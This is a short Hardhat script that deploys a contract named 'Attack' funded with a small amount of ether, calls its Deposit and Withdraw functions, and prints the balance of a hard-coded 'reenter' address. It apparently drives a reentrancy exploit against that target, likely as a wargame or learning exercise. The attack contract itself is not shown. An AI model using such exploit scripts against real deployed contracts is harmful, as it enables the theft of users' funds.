import { ethers } from "hardhat";
import * as helper from "./helpful_scripts";

async function main() {
    const [account] = await ethers.getSigners();
    const reenterAddress = "0xe08830755E04e52ce5E62a11ea4a4E81b2530E71";

    const Attack = await ethers.getContractFactory("Attack");
    const attack = await Attack.deploy({
        value: ethers.utils.parseEther("0.0001")
    });

    console.log(attack.address);

    let tx = await attack.Deposit();
    await tx.wait();

    tx = await attack.Withdraw({
        gasLimit: 10000000
    });
    await tx.wait();

    console.log(await helper.provider.getBalance(reenterAddress));
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });